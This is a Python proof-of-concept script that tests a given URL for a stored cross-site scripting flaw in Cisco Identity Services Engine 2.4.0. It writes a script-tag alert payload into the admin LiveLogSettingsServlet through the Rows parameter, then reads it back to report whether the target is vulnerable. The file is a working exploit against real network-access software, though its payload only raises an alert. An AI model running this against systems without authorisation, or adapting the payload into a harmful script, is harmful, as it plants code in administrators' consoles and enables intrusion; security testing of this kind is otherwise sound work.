#!/usr/bin/env python3
# coding:utf-8
import sys

import requests

from termcolor import colored


def Verify_XSS(url):
    """Verify the website includes Cisco Identity Services
    Engine version 2.4.0 stored_XSS Vulnerability"""
    Attack_URL = "{0}/admin/LiveLogSettingsServlet?Action=write&Columns=1&Rows=<script>alert('Here is a XSS')</script>&Refresh_rate=1337&Time_period=1337".format(url)
    Read_URL = "{0}/admin/LiveLogSettingsServlet?Action=read".format(url)
    try:
        requests.get(Attack_URL)
        req = requests.get(Read_URL)
        response = req.text
        if response:
            if "<script>alert('Here is a XSS')</script>" in response:
                print(colored("{0} is vulnerable".format(url), 'green'))
            else:
                print(colored("{0} is not vulnerable".format(url), 'red'))
    except Exception as e:
        print(colored("Looks like some errors appears~~", 'red'))
        print(colored(e, 'red'))


def main():
    url = ""
    args = sys.argv
    if len(args) == 2:
        url = args[1]
        Verify_XSS(url)
    else:
        print(colored("Usage: python {0} needs url".format(args[0]),'red'))


if __name__ == '__main__':
    main()

